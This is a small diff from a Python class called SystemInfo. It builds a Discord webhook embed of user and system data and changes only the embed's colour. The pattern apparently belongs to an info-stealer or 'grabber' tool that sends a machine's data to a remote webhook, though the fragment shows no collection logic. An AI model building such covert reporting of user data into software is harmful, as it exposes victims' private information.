@@ -15,7 +15,7 @@ import time
 class SystemInfo():
     def __init__(self, webhook: str) -> None:
         webhook = SyncWebhook.from_url(webhook)
-        embed = Embed(title="System Information", color=0x000000)
+        embed = Embed(title="System Information", color=0x2f3136)
 
         embed.add_field(
             name=self.user_data()[0],
